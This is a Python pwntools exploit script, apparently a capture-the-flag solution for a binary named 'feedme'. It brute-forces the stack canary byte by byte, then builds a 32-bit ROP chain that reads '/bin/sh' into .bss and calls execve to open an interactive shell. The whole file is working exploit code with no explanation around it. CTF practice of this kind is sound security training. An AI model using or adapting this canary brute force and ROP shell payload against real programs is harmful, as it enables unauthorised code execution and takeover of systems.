from pwn import *

#context.log_level = 'debug'
p = process("./feedme")
e= ELF('./feedme')

def FEED_ME(food):
	p.sendafter("FEED ME!",chr(len(food)))
	p.send(food)

canary = ""

for i in range(0,4):
	for c in range(0,256):
		FEED_ME("A"*32+canary+chr(c))
		if not "*** stack smashing detected ***" in p.recvuntil("Child exit."):
			canary+=chr(c)
			break
log.info("canary    : 0x%x " % u32(canary))

bss = e.bss()	# bss address
pop_eax = 0x809e17a	#pop eax, pop ebx, pop esi, pop edi, ret
pop_dcb = 0x806f370 #pop edx, pop ecx, pop ebx

syscall_ret = 0x806fa20	# int 0x80; ret

payload =  "A"*32	# buffer
payload += canary	# cannary
payload += "B"*8+"CCCC"	# dummy + sfp
payload += p32(pop_eax)	# ret
payload += p32(0x03)+"AAAA"*3 #sys_read
payload += p32(pop_dcb)	# sys_read(0, bss, 8);
payload += p32(8)	#/bin/sh\00 length
payload += p32(bss)
payload += p32(0) #stdin
payload += p32(syscall_ret)	# syscall

payload += p32(pop_eax)
payload += p32(0x0b)+"AAAA"*3 #sys_execve	#http://syscalls.kernelgrok.com/
payload += p32(pop_dcb)	#sys_execve("/bin/sh", 0, 0);
payload += p32(0)*2
payload += p32(bss)
payload += p32(syscall_ret) # syscall
payload += "BBBB"


print(FEED_ME(payload))
p.send("/bin/sh\00")
p.interactive()